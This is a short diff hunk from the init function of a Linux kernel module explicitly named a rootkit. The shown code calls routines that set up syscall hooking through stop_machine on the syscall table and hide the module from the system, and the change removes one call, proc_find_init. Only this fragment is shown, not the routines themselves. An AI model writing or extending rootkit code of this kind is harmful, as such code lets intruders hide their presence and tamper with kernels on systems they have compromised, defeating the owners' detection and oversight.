@@ -12,7 +12,6 @@ static int __init rootkit_init(void)
 {
     printk(KERN_ALERT "rootkit init\n");
     init_x64_sys_call();
-    proc_find_init();
     stop_machine(init_syscall_table, NULL, NULL);
     hide_module();
     utils_init();
